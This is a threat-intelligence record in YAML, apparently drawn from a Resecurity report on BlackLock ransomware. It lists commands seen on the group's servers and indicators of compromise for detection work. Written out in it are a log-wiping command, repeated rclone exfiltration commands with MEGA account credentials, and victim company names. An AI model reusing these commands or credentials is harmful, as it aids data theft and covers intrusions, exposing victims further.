@@ -1,0 +1,259 @@
+description: BlackLock Ransomware, also known as "El Dorado" or "Eldorado," is a ransomware-as-a-service
+  (RaaS) outfit that has been active since March 2024. In Q4 of last year, it increased
+  its number of data leak posts by 1,425% quarter-on-quarter.
+attribution:
+- BlackLock Ransomware
+- Unknown
+malware_families:
+- BlackLock
+- Ransomware
+TTPs:
+  processes:
+  - lsblk
+  - df
+  - free
+  - passwd
+  - root
+  - exit
+  - w
+  - last
+  - cat
+  - mount
+  - yum
+  - screen
+  - mc
+  - systemctl
+  - adduser
+  - ifconfig
+  - fail2ban
+  - rsync
+  - man
+  - su
+  - vi
+  - ll
+  - vipw
+  - mv
+  - chown
+  - chmod
+  - rclone
+  - nodejs
+  - mongo
+  - mongod
+  - npm
+  - dnf
+  - make
+  - go
+  - build
+  - tar
+  - ./server2.js
+  - iptables
+  - netstat
+  - ping6
+  - git
+  - wget
+  - unzip
+  - rm
+  - cd
+  - ./rclone
+  - rsync
+  - ls
+  - uname
+  - sudo apt install mlocate
+  - find
+  - top
+  - mypeDesktop.exe
+  - 2.exe
+  commandline:
+  - lsblk
+  - df -h
+  - free -h
+  - passwd root
+  - exit
+  - w
+  - last
+  - cat /dev/null > /var/log/wtmp
+  - mount
+  - yum update
+  - screen -U
+  - systemctl restart tor
+  - adduser blog
+  - passwd blog
+  - ifconfig
+  - yum install fail2ban
+  - man rsync
+  - su blog
+  - vi authorized_keys
+  - ll
+  - vipw
+  - mv blog dataleak
+  - chown blog Data
+  - chmod 700 .ssh
+  - rclone help
+  - yum install nodejs
+  - npm install mongojs
+  - dnf module enable nodejs:20
+  - make build
+  - tar zxvf b.tgz
+  - ./server2.js
+  - iptables -v -n -L
+  - netstat -antp | grep nginx
+  - 'ping6 2600::'
+  - git clone https://gitlab.torproject.org/tpo/anti-censorship/pluggable-transports/lyrebird.git
+  - wget https://downloads.rclone.org/v1.68.1/rclone-v1.68.1-linux-amd64.zip
+  - unzip rclone-v1.68.1-linux-amd64.zip
+  - ./rclone copy --progress --transfers=40 --checkers=20 --drive-chunk-size 128M
+    --use-mmap --max-backlog 999999 --fast-list --use-mmap --exclude "*.exe" --exclude
+    "*.iso" --mega-user sopajelessei-5488@yopmail.com --mega-pass TEM5j59bRtlNiWsPW7CXGuaHEWgaGCygzgDL0ROmKamkZg
+    :mega:PHXCMP.com /home/dataleak/Data_Download/PHXCMP.com
+  - rsync -avr data_leak@45.155.173.96:~/site/public/Data_Download .
+  - ls
+  - cd .././../../
+  - cd tmp/rclone-v1.68.1-linux-amd64/
+  - ./rclone copy --progress --transfers=40 --checkers=20 --drive-chunk-size 128M
+    --max-backlog 999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso"
+    --mega-user sopajelessei-5488@yopmail.com --mega-pass TEM5j59bRtlNiWsPW7CXGuaHEWgaGCygzgDL0ROmKamkZg
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - ./rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M
+    --max-backlog 999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso"
+    --mega-user sopajelessei-5488@yopmail.com --mega-pass TEM5j59bRtlNiWsPW7CXGuaHEWgaGCygzgDL0ROmKamkZg
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - ./rclone obscur 'Guiknbv#ffc@f54R3@'
+  - ./rclone ./rclone obscure 'Guiknbv#ffc@f54R3@'
+  - ./rclone copy --progress --transfers=40 --checkers=20 --drive-chunk-size 128M
+    --max-backlog 999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso"
+    --mega-user sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - ./rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M
+    --max-backlog 999999 --fast-list --us6-mmap --exclude "*.exe" --exclude "*.iso"
+    --mega-user sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - ./rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M
+    --max-backlog 999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso"
+    --mega-user sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - ls -la
+  - ls /home/dataleak/Data_Download/ -la
+  - ls /home/dataleak/ -la
+  - cd /home/
+  - cd dataleak/
+  - cd Da
+  - cd Data_Download/
+  - uname -a
+  - sudo apt install mlocate
+  - apt install mlocate
+  - sudo find / -type d -name "CARRION" 2>/dev/null
+  - find / -type d -name "CARRION" 2>/dev/null
+  - find / -type d -name "CARRION.com" 2>/dev/null
+  - cd /tmp/
+  - cd rclone-v1.68.1-linux-amd64/
+  - cd home/
+  - cd /tmp/rclone-v1.68.1-linux-amd64/home/dataleak/Data_Download/
+  - mv /tmp/rclone-v1.68.1-linux-amd64/home/dataleak/Data_Download/* /home/dataleak/Data_Download/
+  - ls /tmp/rclone-v1.68.1-linux-amd64/home/dataleak/Data_Download/
+  - mongo dataleak
+  - cd ll
+  - cd /home/dataleak/Data_Download
+  - cd NRE
+  - chmod +r NRE
+  - chown root:root *
+  - cd ..
+  - chown dataleak NRE
+  - touch test
+  - cat DirlisterList.txt
+  - top
+  - cat NRE/DirlisterList.txt
+  - ls ls Data_Download/
+  - cd ../
+  - ls cd ../
+  - ls cd tmp
+  - rclone --version
+  - rclone copy --progress --transfers=100 --checkers=50 --drive-chunk-size 128M --use-mmap
+    --max-backlog 999999 --fast-list --mega-user seheziyivei-9142@yopmail.com --mega-pass
+    lYjZGddClgLrdt0Y8lInjX-LTDRMoXeIAcZsBWFohAiq ":mega:Data_Download" "/home/dataleak/Data_Download"
+  - ls ls -la rclone copy --progress --transfers=100 --checkers=50 --drive-chunk-size
+    128M --use-mmap --max-backlog 999999 --fast-list --mega-user seheziyivei-9142@yopmail.com
+    --mega-pass lYjZGddClgLrdt0Y8lInjX-LTDRMoXeIAcZsBWFohAiq ":mega:acumengroup.us"
+    "/home/dataleak/Data_Download"
+  powershell:
+  - ''
+  scripting_engine:
+  - ''
+  registry_keys:
+  - ''
+  image_load:
+  - ''
+  network_connections:
+  - wget https://myrtlebeachcustomhomebuilder.com/images/logo-flip.png
+  - wget https://tiendascarrion.com/cdn/shop/files/Screen_Shot_2019-06-04_at_4.12.20_PM_180x.png?v=1613523136
+  - mv Screen_Shot_2019-06-04_at_4.12.20_PM_180x.png\\?v\\=1613523136 carrion.png
+  - wget http://lalucky.com/wp-content/uploads/2019/11/logo.png
+  - mv logo.png lalucky-logo.png
+  - rclone copy --progress --transfers=40 --checkers=20 --drive-chunk-size 128M --max-backlog
+    999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso" --mega-user
+    sopajelessei-5488@yopmail.com --mega-pass TEM5j59bRtlNiWsPW7CXGuaHEWgaGCygzgDL0ROmKamkZg
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M --max-backlog
+    999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso" --mega-user
+    sopajelessei-5488@yopmail.com --mega-pass TEM5j59bRtlNiWsPW7CXGuaHEWgaGCygzgDL0ROmKamkZg
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=40 --checkers=20 --drive-chunk-size 128M --max-backlog
+    999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso" --mega-user
+    sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M --max-backlog
+    999999 --fast-list --us6-mmap --exclude "*.exe" --exclude "*.iso" --mega-user
+    sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=100 --checkers=60 --drive-chunk-size 128M --max-backlog
+    999999 --fast-list --use-mmap --exclude "*.exe" --exclude "*.iso" --mega-user
+    sopajelessei-5488@yopmail.com --mega-pass z8asHp87-_8LBGtgDgln9ea5zCwz0ZjlDyPIj1d2ofj2rQ
+    ":mega:Data_Download" "home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=100 --checkers=50 --drive-chunk-size 128M --use-mmap
+    --max-backlog 999999 --fast-list --mega-user seheziyivei-9142@yopmail.com --mega-pass
+    lYjZGddClgLrdt0Y8lInjX-LTDRMoXeIAcZsBWFohAiq ":mega:Data_Download" "/home/dataleak/Data_Download"
+  - rclone copy --progress --transfers=100 --checkers=50 --drive-chunk-size 128M --use-mmap
+    --max-backlog 999999 --fast-list --mega-user seheziyivei-9142@yopmail.com --mega-pass
+    lYjZGddClgLrdt0Y8lInjX-LTDRMoXeIAcZsBWFohAiq ":mega:acumengroup.us" "/home/dataleak/Data_Download"
+  - http://v3h7hldpdjt7mzvszahjspkecsoSxzlakxvi67oh7yj3it511bg2p.onion
+  - https://www.torproject.org/
+  - http://3pktcrcbmssvraweSskburdwe2h3veibdnnSkbjqihsg6eu6seb7ryqd.onion
+  file_activity:
+  - /var/log/wtmp
+  - /etc/issue
+  - /home/dataleak/Data_Download/PHXCMP.com
+  - /home/dataleak/Data_Download/myrtlebeachcustomhomebuilder.com
+  - /home/dataleak/Data_Download/symbisystems.com
+  - /home/dataleak/Data_Download/MULLENWYLIE
+  - /tmp/rclone-v1.68.1-linux-amd64/home/dataleak/Data_Download/* /home/dataleak/Data_Download/
+  - /home/dataleak/Data_Download/AVOCATS/
+  - /home/dataleak/Data_Download/REESNQT/
+  - HOW_RETURN_YOUR_DATA.TXT
+  persistence:
+  - systemctl enable tor
+  - systemctl start tor
+  - systemctl status tor
+  - systemctl restart tor
+  - setsebool -P httpd_can_network_connect 1
+  - ''
+  pipes:
+  - ''
+  process_relations:
+  - ''
+IOCs:
+  hashes: []
+  IPs:
+  - 185.147.124.0 - 185.147.124.255
+  - 185.158.113.114
+  domains:
+  - v3h7hldpdjt7mzvszahjspkecsoSxzlakxvi67oh7yj3it511bg2p.onion
+  - www.torproject.org
+  - 3pktcrcbmssvraweSskburdwe2h3veibdnnSkbjqihsg6eu6seb7ryqd.onion
+  URLs:
+  - http://v3h7hldpdjt7mzvszahjspkecsoSxzlakxvi67oh7yj3it511bg2p.onion
+  - https://www.torproject.org/
+  - http://3pktcrcbmssvraweSskburdwe2h3veibdnnSkbjqihsg6eu6seb7ryqd.onion
+authors:
+- Resecurity
+reference: https://www.resecurity.com/blog/article/blacklock-ransomware-a-late-holiday-gift-with-intrusion-into-the-threat-actors-infrastructure
+date_of_publication: March 25, 2025
+file_creation_date: August 03, 2025
